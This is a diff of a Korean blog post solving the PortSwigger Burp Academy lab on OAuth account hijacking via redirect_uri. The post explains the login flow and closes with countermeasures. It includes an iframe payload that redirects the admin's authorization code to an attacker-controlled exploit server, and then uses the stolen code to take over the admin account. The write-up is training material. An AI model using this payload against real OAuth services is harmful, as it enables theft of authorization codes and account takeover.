@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Burp Academy-OAuth 세번째 문제: Leaking authorization codes and access tokens"
+title: "Burp Academy-OAuth 세번째 문제: OAuth account hijacking via redirect_uri"
 categories: [보안취약점, Burp Academy]
 tags: [보안취약점, Burp Academy, OAuth취약점]
 toc: true
@@ -8,8 +8,6 @@ toc: true
 
 # 개요
 - OAuth 2.0 인증에 관련된 취약점이다. 
-- Authorization Code가로채기 공격(Authorization Code interception attack) 에 대한 랩이다. 
-- 참고로 이 공격에 대한 대책으로 [PKCE]({% post_url 2023-04-20-pkce %})가 있다. 
 - 취약점 설명 주소: https://portswigger.net/web-security/oauth
 - 문제 주소: https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri
 - 난이도: PRACTITIONER (보통)
@@ -33,8 +31,8 @@ Note that using state or nonce protection does not necessarily prevent these att
 
 # 랩설명: OAuth account hijacking via redirect_uri
 - 이 랩은 소셜 미디어 계정(OAuth)을 사용해서 로그인할 수 있는 기능이 있다. 
-- exploit서버를 이용해서 관리자 유저의 Authorization Code 를 훔친다. 
-- 훔친 코드를 사용해서 관리자로 로그인한 후, Calros 유저를 삭제하면 문제가 풀린다. 
+- OAuth 프로바이더 쪽의 설정미스로 인해 공격자가 인가 코드(Authorization Code)를 얻어서 다른 유저의 계정에 접근할 수 있다.  
+- 랩을 풀려면 exploit서버를 이용해서 관리자 유저의 인가 코드를 훔친다. 훔친 코드를 사용해서 관리자로 로그인한 후, Calros 유저를 삭제하면 랩이 풀린다. 
 
 ```
 This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
@@ -51,7 +49,7 @@ You can log in with your own social media account using the following credential
 ## 로그인 과정 관찰 
 일단 로그인 과정을 살펴본다. 
 
-소셜미디어계정으로 로그인을 하려고 하면 다음과 같이 Oauth 서비스쪽으로 HTTP요청을 보낸다. redirect_uri를 포함해서 response_type, scope등이 파라메터로 포함되어 있다. 
+소셜미디어계정으로 로그인을 하려고 하면 다음과 같이 Oauth 인가서버쪽으로 HTTP요청을 보낸다. redirect_uri를 포함해서 response_type, scope등이 파라메터로 포함되어 있다. 
 
 ```http
 GET /auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri=https://0aa1005d041fe0468120a26500e8000d.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
@@ -71,7 +69,13 @@ Te: trailers
 
 ```
 
-OAuth서비스는 다음과 같이 원래의 랩으로 리다이렉트를 지시하는 응답을 회신한다. URL에 인증코드(`code`파라메터)가 포함되어 있다.
+OAuth사이트(소셜미디어 사이트)는 로그인 페이지로 유저를 리다이렉트시킨다. 유저가 로그인에 성공하면 다음과 같이 데이터에 접근을 허용할 것인지를 묻는 화면이 나타난다. 
+
+![](/images/burp-academy-oauth-3-6.png)
+
+
+유저가 Continue 버튼을 클릭하면, OAuth인가 서버는 다음과 같이 원래의 웹 사이트(클라이언트 어플리케이션)으로 리다이렉트를 지시하는 응답을 회신한다. URL에 인가코드(`code`파라메터)가 포함되어 있다.
+
 
 ```http
 HTTP/2 302 Found
@@ -110,23 +114,31 @@ Te: trailers
 
 ```
 
+이 요청에 대한 응답은 다음과 같다. 로그인이 성공했다는 메세지를 보여준다. 
+
+![](/images/burp-academy-oauth-3-7.png)
+
+
+
+
 ## 공격 방법 검토 
-- 그러면 어떻게 관리자의 Auth 코드를 얻을 수 있을까 생각해보자. 
-- redirect_uri를 exploit서버로 변경한 요청을 보내도록 하는 iframe을 쓰면 될 것 같다. 
-- 즉 다음과 같다. 
+- 이 랩 서버의 취약점은 인가코드만으로 로그인이 가능하다는 점, 그리고 OAuth서버가 redirect_uri를 체크하지 않는다는 점이다. 
+- 관리자의 인가 코드만 얻으면 관리자로 로그인할 수 있을 것이다. 
+- 그리고  OAuth서버가 redirect_uri를 체크하지 않으므로 redirect_uri를 exploit서버로 변경한 OAuth인가요청을 발생시키는 iframe을 쓰면 될 것 같다. 
+- 다음과 같다. 
 
 ```html
-<iframe src="https://{OAuth서버URL}/auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri={exploit서버URL}/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
+<iframe src="https://{OAuth인가서버URL}/auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri={exploit서버URL}&response_type=code&scope=openid%20profile%20email"></iframe>
 ```
-- 관리자가 이 페이지를 열면 OAuth서버에 로그인 요청이 보내지게 될 것이다. (GET /auth?client_id=xxxxx&redirect_uri=xxxx)
-- OAuth서버는 code를 발행하여 exploit서버로 리다이렉트 시킬 것이다.  
-- exploit서버의 접근로그를 보면 code값을 확인할 수 있을 것이다. (URL에 ocde가 포함되므로)
+- 관리자가 이 iframe이 포함된 페이지를 열면 OAuth서버에 로그인 요청이 보내지게 될 것이다. (GET /auth?client_id=xxxxx&redirect_uri=xxxx)
+- 관리자가 로그인을 수행하면, OAuth인가서버는 인가코드(code)를 발행하여 exploit서버로 리다이렉트 시킬 것이다.  
+- exploit서버의 접근로그를 보면 code값을 확인할 수 있을 것이다. (URL에 code가 포함되므로)
 
 ## explit 서버 구성
 다음과 같이 구성하였다. client_id값은 문제 세션마다 상이하다. 적절하게 변경한다. 그리고 Deliver exploit to victim을 클릭한다. 
 
 ```html 
-<iframe src="https://oauth-0a1a00ec037741f383d50d69023f00bf.oauth-server.net/auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri=https://exploit-0a24008c031941c983d00e8801fd0096.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
+<iframe src="https://oauth-0a1a00ec037741f383d50d69023f00bf.oauth-server.net/auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri=https://exploit-0a24008c031941c983d00e8801fd0096.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
 ```
 
 ![exploit 서버](/images/burp-academy-oauth-3-2.png)
@@ -165,6 +177,12 @@ Te: trailers
 
 ![관리자 유저 로그인 성공](/images/burp-academy-oauth-3-5.png)
 
-Admin메뉴로 들어가서 Calors 유저를 삭제하면 풀이 성공했다는 메세지가 나타난다. 
+Admin메뉴로 들어가서 Calors 유저를 삭제하면 랩이 풀린다. 
 
 ![관리자 유저 로그인 성공](/images/burp-academy-oauth-3-success.png)
+
+# 대책
+다음 대책이 유용한 것으로 생각된다. 
+
+- PKCE와 비슷한 방어 메커니즘을 도입한다. 즉, 인가 코드만으로 로그인이 가능한 것을 개선한다 (로그인 시에 CSRF 기능을 도입한다).
+- OAuth 서비스 측에서 redirect_uri가 클라이언트의 정당한 redirect_uri인지 확인
